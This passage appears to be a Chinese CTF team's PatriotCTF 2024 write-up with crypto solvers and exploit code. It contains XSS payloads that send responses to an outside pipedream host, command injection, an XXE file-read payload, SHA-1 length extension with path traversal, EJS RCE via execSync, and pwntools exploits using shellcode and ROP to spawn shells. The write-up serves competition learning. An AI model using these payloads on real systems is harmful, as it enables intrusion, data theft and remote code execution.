    s2=[90,i,82,0xbe]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('p',end=' ')
        #continue
    s1=[i,i,106,113]
    s2=[20,113,113,52]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('q',end=' ')
        #continue
    s1=[i,114,114,0xdd]
    s2=[114,25,114,105]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('r',end=' ')
        #continue
    s1=[27,i,0x27,0]
    s2=[63,i,i,41]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('s',end=' ')
        #continue
    s1=[i,84,i,91]
    s2=[i,116,0xda,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('t',end=' ')
        #continue
    s1=[117,33,0x95,0xe9]
    s2=[117,0x94,110,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('u',end=' ')
        #continue
    s1=[0xa7,0xce,i,118,]
    s2=[0x8b,118,i,71]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('v',end=' ')
        #continue
    s1=[119,0xa7,119,119]
    s2=[0xdd,i,87,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('w',end=' ')
        #continue
    s1=[120,111,0x94,0x9b]
    s2=[0x9a,0xd1,0xa7,44]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('x',end=' ')
        #continue
    s1=[2,0xf2,126,0xcc]
    s2=[56,121,121,64]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('y',end=' ')
        #continue
    s1=[i,i,0xcc,122]
    s2=[i,92,0xbd,0xdd]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('z',end=' ')
        #continue
    s1=[0x3a,0x66,65,65]
    s2=[0xf8,65,65,65]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('A',end=' ')
        #continue
    s1=[44,i,66,66]
    s2=[66,66,91,66]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('B',end=' ')
        #continue
    s1=[0x23,0x33,i,i]
    s2=[67,0x8f,i,67]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('C',end=' ')
        #continue
    s1=[0xad,21,75,i]
    s2=[i,i,0xc2,68]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('D',end=' ')
        #continue
    s1=[0xd4,i,0x82,i]
    s2=[i,i,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('E',end=' ')
        #continue
    s1=[0xb6,70,0x84,70]
    s2=[78,70,70,70]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('F',end=' ')
        #continue
    s1=[108,0xbe,71,0x84]
    s2=[102,0x85,i,124]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('G',end=' ')
        #continue
    s1=[0x9c,72,17,95]
    s2=[i,i,72,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('H',end=' ')
        #continue
    s1=[i,31,63,0x9c]
    s2=[i,104,0xf0,0xed]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('I',end=' ')
        #continue
    s1=[0x45,0x38,0x1b,0x9d]
    s2=[0x1b,0x2e,74,74]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('J',end=' ')
        #continue
    s1=[0xfd,75,75,75]
    s2=[75,75,i,0xb7]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('K',end=' ')
        #continue
    s1=[0x20,0x66,i,0xea]
    s2=[i,i,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('L',end=' ')
        #continue
    s1=[73,4,i,77]
    s2=[0xef,0xbb,77,77]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('M',end=' ')
        #continue
    s1=[i,71,78,i]
    s2=[0xb5,1,78,28]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('N',end=' ')
        #continue
    s1=[79,i,0x71,0x32]
    s2=[0xe3,i,79,13]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('O',end=' ')
        #continue
    s1=[0xed,i,i,27]
    s2=[80,80,0xbc,80]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('P',end=' ')
        #continue
    s1=[i,36,i,i]
    s2=[i,0xf0,0xbf,81]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('Q',end=' ')
        #continue
    s1=[82,i,i,i]
    s2=[0xa7,82,i,i]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('R',end=' ')
        #continue
    s1=[32,83,i,108]
    s2=[0x94,111,83,0xfb]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('S',end=' ')
        #continue
    s1=[0xe8,84,i,84]
    s2=[84,0xad,0xe0,110]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('T',end=' ')
        #continue
    s1=[i,70,114,0xeb]
    s2=[85,34,0xdb,0xc5]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('U',end=' ')
        #continue
    s1=[i,97,17,0xe8]
    s2=[i,35,0x8e,11]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('V',end=' ')
        #continue
    s1=[87,51,69,0x87]
    s2=[i,0xcc,87,87]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('W',end=' ')
        #continue
    s1=[88,i,107,88]
    s2=[88,88,i,117]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('X',end=' ')
        #continue
    s1=[41,0xcf,89,0x81]
    s2=[32,89,86,0xe8]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('Y',end=' ')
        #continue
    s1=[0x98,99,90,77]
    s2=[0xaf,0x8f,90,0xab]
    tmp=func(s1,s2)%255
    if tmp==result[i]:
        print('0',end=' ')
        #continue
    s1=" !#$%&'()*+,-./:;<=>?@[]^_`{|}~"
    for c in s1:
        tmp=(ord(c)*i)%255
        if tmp==result[i]:
            print(c,end=' ')
#pctf{d33p_le@rnING}

Crypto

idk cipher

逆算法即可

import base64
srt_key = 'secretkey'
enc = base64.b64decode("QRVWUFdWEUpdXEVGCF8DVEoYEEIBBlEAE0dQAURFD1I=")
res = []
res_rsv = []
for i in range(0,len(enc),2):
    enc_p1 = enc[i]
    enc_p2 = enc[i+1]
    c1 = chr(enc_p1 ^ ord(srt_key[(i//2) % len(srt_key)]))
    c2 = chr(enc_p2 ^ ord(srt_key[(i//2) % len(srt_key)]))
    res.append(c1)
    res_rsv.append(c2)

print("pctf{"+"".join(res)+"".join(res_rsv[::-1])+"}")

Bigger is Better

维纳板子

import gmpy2
import libnum

def continuedFra(x, y):
    cf = []
    while y:
        cf.append(x // y)
        x, y = y, x % y
    return cf

def gradualFra(cf):
    numerator = 0
    denominator = 1
    for x in cf[::-1]:
        numerator, denominator = denominator, x * denominator + numerator
    return numerator, denominator

def solve_pq(a, b, c):
    par = gmpy2.isqrt(b * b - 4 * a * c)
    return (-b + par) // (2 * a), (-b - par) // (2 * a)

def getGradualFra(cf):
    gf = []
    for i in range(1, len(cf) + 1):
        gf.append(gradualFra(cf[:i]))
    return gf

def wienerAttack(e, n):
    cf = continuedFra(e, n)
    gf = getGradualFra(cf)
    for d, k in gf:
        if k == 0: continue
        if (e * d - 1) % k != 0:
            continue
        phi = (e * d - 1) // k
        p, q = solve_pq(1, n - phi + 1, n)
        if p * q == n:
            return d

N = 0xa0d9f425fe1246c25b8c3708b9f6d7747dd5b5e7f79719831c5cbe19fb7bab66ed62719b3fc6090120d2cfe1410583190cd650c32a4151550732b0fc97130e5f02aa26cb829600b6ab452b5b11373ec69d4eaae6c392d92da8bcbea85344af9d4699e36fdca075d33f58049fd0a9f6919f3003512a261a00985dc3d9843a822974df30b81732a91ce706c44bde5ff48491a45a5fa8d5d73bba5022af803ab7bd85250e71fc0254fcf078d21eaa5d38724014a85f679e8a7a1aad6ed22602465f90e6dd8ef95df287628832850af7e3628ad09ff90a6dbdf7a0e6d74f508d2a6235d4eae5a828ac95558bbdf72f39af5641dfe3edb0cdaab362805d926106e2af
e = 0x5af5dbe4af4005564908a094e0eabb0a921b7482483a753e2a4d560700cb2b2dc9399b608334e05140f54d90fcbef70cec097e3f75395d0c4799d9ec3e670aca41da0892a7b3d038acb7a518be1ced8d5224354ce39e465450c12be653639a8215afb1ba70b1f8f71fc1a0549853998e2337604fca7edac67dd1e7ddeb897308ebf26ade781710e6a2fe4c533a584566ea42068d0452c1b1ecef00a781b6d31fbab893de0c9e46fce69c71cefad3119e8ceebdab25726a96aaf02a7c4a6a38d2f75f413f89064fef14fbd5762599ca8eb3737122374c5e34a7422ea1b3d7c43a110d3209e1c5e23e4eece9e964da2c447c9e5e1c8a6038dc52d699f9324fd6b9
c = 0x731ceb0ac8f10c8ff82450b61b414c4f7265ccf9f73b8e238cc7265f83c635575a9381aa625044bde7b34ad7cce901fe7512c934b7f6729584d2a77c47e8422c8c0fe2d3dd12aceda8ef904ad5896b971f8b79048e3e2f99f600bf6bac6cad32f922899c00fdc2d21fcf3d0093216bfc5829f02c08ba5e534379cc9118c347763567251c0fe57c92efe0a96c8595bac2c759837211aac914ea3b62aae096ebb8cb384c481b086e660f0c6249c9574289fe91b683609154c066de7a94eafa749c9e92d83a9d473cc88accd9d4c5754ccdbc5aa77ba9a790bc512404a81fc566df42b652a55b9b8ffb189f734d1c007b6cbdb67e14399182016843e27e6d4e5fca

d = wienerAttack(e, N)
m = pow(c, d, N)
print(libnum.n2s(m))

Hard to Implement

爆破一下就行

from pwn import *

io = remote("chal.competitivecyber.club",6001)

flag = b"pctf{"
for i in range(16):
    io.sendlineafter(b"> ",b"a"*(15-len(flag)))
    io.recvuntil(b"> ")
    enc = io.recv(32)
    for j in range(32,127):
        io.sendlineafter(b"> ",b"a"*(15-len(flag))+flag+int.to_bytes(j))
        io.recvuntil(b"> ")
        try_enc = io.recv(32)
        if try_enc == enc:
            flag += int.to_bytes(j)
            print(flag)
            break

Bit by Bit

from Crypto.Util.number import *
data = open("out.txt","r").read().replace("n","")
res = [[0]*16]*(len(data)//32)
for i in range(0,len(data),32):
    res[i//32] = [int(data[i:i+32][j:j+2],16) for j in range(0,len(data[i:i+32]),2)]

kj = set(range(32,127)) | set((10,))

key = 0
for idx in range(15):
    pos1 = [i[idx] for i in res]
    for i in range(0,256):
        try_set = set([i^j for j in pos1])
        if try_set.issubset(kj):
            key = (key << 8) + i

key = key << 8
iv = 0
res = b""
for i in range(0,len(data),32):
    chunk = int(data[i:i+32],16)
    iv = (iv+1) % 255
    curr_k = key+iv
    decoded = chunk ^ curr_k
    res += long_to_bytes(decoded)

print(res)

Forensics

Slingshot

通过 HTTP 协议过滤数据包。找到从远程服务器下载 pyc 文件的内部 IP 地址。提取 pyc 文件并进行反编译，发现这是一个文件加密和数据外泄的脚本。该脚本固定发送到端口 22993。由此可以知道这是攻击者用来将文件外泄到外部的工具。

攻击者 IP：10.151.198.69

从其服务器 93.132.55.192 下载文件

使用

通过逆向工程攻击者的脚本来解密数据

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
#!/usr/bin/env python3
from flask import Flask, request, render_template, jsonify, abort, redirect, session
import uuid
import os
from datetime import datetime, timedelta
import hashlib
app = Flask(__name__)
server_start_time = datetime.now()
server_start_str = "20240921153014"
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=300)
flag = os.environ.get('FLAG', "flag{this_is_a_fake_flag}")
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
def is_safe_username(username):
    """Check if the username is alphanumeric and less than 20 characters."""
    return username.isalnum() and len(username) < 20
@app.route('/', methods=['GET', 'POST'])
def main():
    """Handle the main page where the user submits their username."""
    if request.method == 'GET':
        uid = uuid.uuid5(secret, "administrator")
        session['username'] = "administrator"
        session['is_admin'] = True
        session['uid'] = str(uid)
        return "1"
@app.route('/user/<uid>')
def user_page(uid):
    """Display the user's session page based on their UUID."""
    try:
        uid = uuid.UUID(uid)
    except ValueError:
        abort(404)
    session['is_admin'] = False
    return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
@app.route('/admin')
def admin_page():
    """Display the admin page if the user is an admin."""
    print(session.get('is_admin'))
    print(uuid.uuid5(secret, 'administrator'))
    print(session.get('username') == 'administrator')
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    formatted_uptime = str(uptime).split('.')[0]
    formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    status_content = f"""Server uptime: {formatted_uptime}<br>
    Server time: {formatted_current_time}
    """
    return status_content
if __name__ == '__main__':
    app.run("0.0.0.0", port=9999)
```



```
POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
Host: chal.competitivecyber.club:13337
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=.eJwVzMsOQ0AYQOF3sa-4tnQnEzPzT-qSClo7o8IMEQm90PTdy_bk5Psq5XNulbNSL6zlpBKRYJCuoIcCJhiudoXgCN14yxBz1W3qeY5HvkeJvSCxJTc0cUGsr6knIumbgazewepbofQ2gL04SXd0KfKHzgleYNDUZmbJIcMTcehamF0gR6c0XGuwrQghGn_u8ckb1piC2yi_PzGnNSc.Zu9_1A.RyzhVRc9_EAYBfWQPA3GeEmVX0c
Connection: close
Content-Type: application/json
Content-Length: 325

{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal',true);xmlhttp.send();</script>","high_score":999}
```



```
POST http://chal.competitivecyber.club:13337/api/stats HTTP/1.1
Host: chal.competitivecyber.club:13337
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=.eJwVzMsOQ0AYQOF3sa-4tnQnEzPzT-qSClo7o8IMEQm90PTdy_bk5Psq5XNulbNSL6zlpBKRYJCuoIcCJhiudoXgCN14yxBz1W3qeY5HvkeJvSCxJTc0cUGsr6knIumbgazewepbofQ2gL04SXd0KfKHzgleYNDUZmbJIcMTcehamF0gR6c0XGuwrQghGn_u8ckb1piC2yi_PzGnNSc.Zu9_1A.RyzhVRc9_EAYBfWQPA3GeEmVX0c
Connection: close
Content-Type: application/json
Content-Length: 348

{"username":"<script>xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.open('https://eog62dv2ryao10.m.pipedream.net?a=' + xmlhttp.responseText)}};xmlhttp.open('GET','http://127.0.0.1:1337/api/cal?modifier=|cat flag.txt',true);xmlhttp.send();</script>","high_score":999}
```



```
import struct
import base64
import urllib.parse
import requests

# The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:

top = 0xFFFFFFFF

def rotl(i, n):
    lmask = top << (32 - n)
    rmask = top >> n
    l = i & lmask
    r = i & rmask
    newl = r << n
    newr = l >> (32 - n)
    return newl + newr

def add(l):
    ret = 0
    for e in l:
        ret = (ret + e) & top
    return ret

xrange = range

def sha1_impl(msg, h0, h1, h2, h3, h4):
    for j in xrange(int(len(msg) / 64)):
        chunk = msg[j * 64 : (j + 1) * 64]

        w = {}
        for i in xrange(16):
            word = chunk[i * 4 : (i + 1) * 4]
            (w[i],) = struct.unpack(">i", word)

        for i in range(16, 80):
            w[i] = rotl((w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]) & top, 1)

        a = h0
        b = h1
        c = h2
        d = h3
        e = h4

        for i in range(0, 80):
            if 0 <= i <= 19:
                f = (b & c) | ((~b) & d)
                k = 0x5A827999
            elif 20 <= i <= 39:
                f = b ^ c ^ d
                k = 0x6ED9EBA1
            elif 40 <= i <= 59:
                f = (b & c) | (b & d) | (c & d)
                k = 0x8F1BBCDC
            elif 60 <= i <= 79:
                f = b ^ c ^ d
                k = 0xCA62C1D6

            temp = add([rotl(a, 5), f, e, k, w[i]])
            e = d
            d = c
            c = rotl(b, 30)
            b = a
            a = temp

        h0 = add([h0, a])
        h1 = add([h1, b])
        h2 = add([h2, c])
        h3 = add([h3, d])
        h4 = add([h4, e])

    return (h0, h1, h2, h3, h4)

def pad(msg, sz=None):
    if sz == None:
        sz = len(msg)
    bits = sz * 8
    padding = 512 - ((bits + 8) % 512) - 64

    msg += b"x80"  # append bit "1", and a few zeros.
    return (
        msg + int(padding / 8) * b"x00" + struct.pack(">q", bits)
    )  # don't count the x80 here, hence the -8.

def sha1(msg):
    # These are the constants in a standard SHA-1
    return sha1_impl(
        pad(msg), 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0
    )

# "Local Card Maker"-specific implementation starts here:

def sha1_bytes_to_str(result):
    # return "".join([hex(x)[2:].zfill(2) for x in result])
    return "".join([hex(x)[2:].zfill(8) for x in result])

def get_h_values(hash_string):
    # Divide hash_string to 5 ints, 4 bytes each
    return [int(hash_string[i * 8 : (i + 1) * 8], 16) for i in range(5)]

# "view_profile" taken from site ("page" query parameter)
block_1_buf = b"1.png"
# Hash taken from site ("pHash" query parameter)
# block_1_hash = b"06dadc9db741e1c2a91f266203f01b9224b5facf"
block_1_hash = b"06dadc9db741e1c2a91f266203f01b9224b5facf"
block_1_h_values = get_h_values(block_1_hash)
# taken from description of challenge
# salt_len = 12

# "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
# I align to 4 bytes in order for the appended path to be parsed correctly.
block_2_buf = b"/../../../../../../../flag".replace(b"n", b"")
# Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
block_2_buf_padded = pad(block_2_buf, len(block_2_buf) + 64)
print(sha1_impl(block_2_buf_padded, *block_1_h_values))
joined_buf_hash = sha1_bytes_to_str(sha1_impl(block_2_buf_padded, *block_1_h_values))
print(joined_buf_hash)
# Add 23 "A"s to simulate the SHA-1 sblock creation with the salt, but remove the salt since it'll be added by the server.
for salt_len in range(12, 13):
    joined_buf = pad((b"A" * salt_len) + block_1_buf)[salt_len:] + block_2_buf

    # print(block_2_buf)
    # print(joined_buf)
    encoded_joined_buf = urllib.parse.quote_plus(joined_buf)
    # print(encoded_joined_buf)

    res = requests.get(
        "http://chal.competitivecyber.club:7777/view.php?pic=%s&hash=%s"
        % (encoded_joined_buf, joined_buf_hash)
    ).content
    if "Invalid".encode() not in res:
        print("length:" + str(salt_len))
        print(block_2_buf)
        print(joined_buf)
        print(encoded_joined_buf)
        print(res)
```



```
pctf{3xt3nd_my_th4nk5_e9b5f6aa07}
```



```
const express = require('express');
const app = express();

// Middleware to log each request
app.use((req, res, next) => {
    const now = new Date().toISOString();
    console.log(`${now} - ${req.method} request to ${req.url}`);
    next();  // Pass control to the next handler
});

// Route to return a JSON object
app.get('/get-json', (req, res) => {
    // URL-encoded string
    const encodedComment = "%3c%21%44%4f%43%54%59%50%45%20%64%20%5b%3c%21%45%4e%54%49%54%59%20%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%61%70%70%2f%66%6c%61%67%2e%74%78%74%22%3e%5d%3e%3c%74%3e%26%65%3b%3c%2f%74%3e"
    // Decode the URL-encoded string
    const decodedComment = decodeURIComponent(encodedComment);
    // Construct the JSON object
    const data = {
        "Comment": decodedComment,          // Original encoded string
    };

    // Return the JSON object
    res.json(data);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
```



```
POST /check HTTP/1.1
Host: ServerIP:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSrmpxcWJ6alKOkp--QrFqTmpySWpKQppmTmpSrG1OkSpiq0FAErYHiI.Zu8lIw.ZSSS4NVC8C_YhJAAJ-iPCZZFv30
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

url=http://ServerIP:3000/get-json
```



```
PCTF{Y0u_D00m3D_U5_Man_So_SAD}
```



```
?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync("touch /tmp/3.txt");&settings[view%20options][client]=true
```



```
http://chal.competitivecyber.club:3000/?settings[view%20options][client]=1&settings[view%20options][escape]={}.constructor.constructor(%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20flag-6637c8dd34.txt%27)%22)
```



```
from pwn import *
io = remote("",)
def exp():
    io.recvuntil(b">> ")
    io.sendline(b"A"*(0x48-0x22)+b"AAAAA"+b"x00")
    io.recvuntil(b">> ")
    io.sendline(b"A"*(0x48-0x22)+b"AAAA"+b"x00")
    io.recvuntil(b">> ")
    io.sendline(b"A"*(0x48-0x22)+b"x82x12x40x00")
    io.recvuntil(b"cool...")

exp()
io.interactive()
```



```
from pwn import *

io = remote("",)

def xorr(pl):
    length = len(pl)
    list_pl = list(pl)
    for i in range(0,length-1,4):
        list_pl[i] ^= list_pl[i+1]
    
    return bytes(list_pl)
    
def exp():
    shellcode_x64 = b'jhHxb8/bin///sPHx89xe7hrix01x01x814$x01x01x01x011xf6Vjx08^Hx01xe6VHx89xe61xd2j;Xx0fx05'
    pl = b"xEBx04ABCD"
    pl += b"x48x87xF7x48x87xD1"
    pl += b"xEBx04ABCD"
    pl += b"x48x31xFFx6Ax7Ex5A"
    pl += b"xEBx04ABCD"
    pl += b"x0Fx05"
    io.send(xorr(pl))

    io.sendline(b"x90"*len(pl)+shellcode_x64)
    
exp()
io.interactive()
```



```
from pwn import *

io = remote("",)

context.log_level = "debug"
context.arch = "amd64"

def setpin(idx,content):
    io.sendlineafter(b">> ",b"1")
    io.sendlineafter(b">> ",str(idx).encode())
    io.sendlineafter(b">> ",content)

def viewpin():
    io.sendlineafter(b">> ",b"2")
    io.sendlineafter(b">> ",b"1")

def exp():
    setpin(-48,b"xf0")
    viewpin()
    data = b"".join(io.recvuntil(b"Quit").replace(b"n",b"").split(b" "))
    if b"x7f" not in data:
        exit(0)

    idxx = data.index(b"x7f")
    canary = u64(data[idxx-0x15:idxx-0x15+8])
    libc_base = u64(data[idxx-5:idxx+1]+b"x00x00") - 0x29d90
    pie = u64(data[idxx+11:idxx+17]+b"x00x00") - 0x14f5
    print(hex(libc_base))
    print(hex(pie))
    print(hex(canary))

    libc = ELF("/home/kali/pwnwork/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6")
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
    rdi_ret = libc_base + 0x000000000002a3e5
    data = flat([rdi_ret+1,rdi_ret,sh_addr,sys_addr])
    cny = p64(canary)
    for i in range(len(cny)):
        setpin(i+0x148,int.to_bytes(cny[i]))

    for i in range(len(data)):
        setpin(i+0x158,int.to_bytes(data[i]))

    io.sendlineafter(b">> ",b"3")
    # viewpin()

exp()
io.interactive()
```



```
from pwn import *

s       = lambda data               :io.send(data)
sa      = lambda tag,data           :io.sendafter(tag, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda tag,data           :io.sendlineafter(tag, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))

io = process("./pwn")
elf = ELF("./pwn")

def toBytes(d):
    return str(d).encode()

def menu(choice):
    sla(b">> ",toBytes(choice))

def add(size,content,c):
    menu(2)
    sla(b">> ",toBytes(size))
    sla(b">> ",content)
    sla(b">> ",c)

def delete(idx):
    menu(4)
    sla(b">> ",toBytes(idx))

def edit(idx,content):
    menu(3)
    sla(b">> ",toBytes(idx))
    sla(b">> ",content)

def overflow(content):
    menu(1)
    sla(b">> ",content)

context.log_level = "debug"
context.arch = "amd64"

def exp():
    loglen = 0x404088
    rdi_ret = 0x00000000004011dc
    add(0x420,b"A",b"y") # 0
    add(0x410,b"B",b"y") # 1
    add(0x410,b"C",b"y") # 2
    delete(0) 
    add(0x500,b"D",b"n") # 0
    delete(2)
    edit(0,p64(loglen-0x20))
    add(0x500,b"E",b"y") # 2
    
    pl = b"A"*0x118 + p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
    overflow(pl)
    menu(5)
    ru(b"day!n")
    puts = u64(r(6) + b"x00x00")

    libc = ELF("/home/kali/pwnwork/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6")
    libc_base = puts - libc.sym['puts']
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))

    pl = b"A"*0x118 + p64(rdi_ret+1) + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
    overflow(pl)
    menu(5)

exp()
io.interactive()
```



```
from pwn import *

s       = lambda data               :io.send(data)
sa      = lambda tag,data           :io.sendafter(tag, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda tag,data           :io.sendlineafter(tag, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda tag, drop=True     :io.recvuntil(tag, drop)
l64     = lambda      :u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))

io = process("./pwn")

def toBytes(d):
    return str(d).encode()

def menu(choice):
    sla(b"> ",toBytes(choice))

def add(size):
    menu(1)
    sla(b"> ",toBytes(size))

def show(idx):
    menu(3)
    sla(b"> ",toBytes(idx))

def delete(idx):
    menu(4)
    sla(b"> ",toBytes(idx))

def edit(idx,content):
    menu(2)
    sla(b"> ",toBytes(idx))
    sla(b"> ",content)

context.log_level = "debug"
context.arch = "amd64"

def fmt(idx,content):
    add(0x30)
    edit(idx,content)
    show(idx)

def exp():
    tag = 0xcafebabe
    fmt(0,b"%15$p")
    ru(b"0x")
    key = int(r(12),16) - 0xf0

    fmt(1,f"%{key&0xffff}c%15$hn")
    fmt(2,f"%{tag&0xffff}c%41$hn")
    fmt(3,f"%{(key+2)&0xffff}c%15$hn")
    fmt(4,f"%{(tag>>16)&0xffff}c%41$hn")

    menu(5)

exp()
io.interactive()
```



```
from pwn import *
context.log_level = "debug"
context.arch = "mips"
io = process(["qemu-mipsel","-L","/usr/mipsel-linux-gnu","-g","8888","./pwn"])
# io = process(["qemu-mipsel","-L","/usr/mipsel-linux-gnu","./pwn"])

# 0x400E60
io.recvuntil(b">> ")
io.sendline(b"1")
io.recvuntil(b">> ")
io.sendline(b"aa")

io.recvuntil(b">> ")
io.sendline(b"2")
io.recvuntil(b">> ")
io.sendline(b"a"*(7*4-1))

io.recvuntil(b"is ")
stack = u32(io.recv(4)) - 0x104
print(hex(stack))

io.recvuntil(b">> ")
io.sendline(b"1")
io.recvuntil(b">> ")
io.sendline(b"."*29+b"a"+p32(stack))

shellcode = b"xffxffx06x28x73x68x0fx3cx62x61xefx35xf8xffxafxafxfcxffxa0xafxf8xffxa4x27xffxffx05x28xabx0fx02x24x0cx01x01x01"
io.recvuntil(b">> ")
io.sendline(b"1")
io.recvuntil(b">> ")
io.sendline(shellcode)

io.recvuntil(b">> ")
io.sendline(b"3")
io.interactive()
```



```
from base64 import b64decode, b64encode
import secrets

# flipFlops = lambda x: chr(ord(x) + 1)

# f=open('topsneaky.txt','rb')
# first=f.read()
# bittys=secrets.token_bytes(len(first))
# onePointFive=int.from_bytes(first)^int.from_bytes(bittys)
# second=onePointFive.to_bytes(len(first))
# third=b64encode(second).decode('utf-8')
# bittysEnc=b64encode(bittys).decode('utf-8')
# fourth=''
# for each in third:
# fourth+=flipFlops(each)
 
# fifth='Mwahahaha you will n'+fourth[0:10]+'ever crack into my pass'+fourth[10:]+"word, i'll even give you the key and the executable:::: "+bittysEnc

fourth='Ocmu{9gtufMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ymp'
bittysEnc='Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV'

bittys=b64decode(bittysEnc)
fourth=list(fourth.encode('utf-8'))
fourth=[chr(c-1) for c in fourth]
third=b64decode(str(fourth))
one=int.from_bytes(third)^int.from_bytes(bittys)
first=one.to_bytes(len(third))
print(first)
#PCTF{I_<3_$3CUR1TY_THR0UGH_0B5CUR1TY!!}
```



```
int main() {
 FILE* f = fopen("E:\oj\2024CTFWXX\2024PatriotCTF\VMception\vm_program.bin", "rb");
 fseek(f, 0, 2);
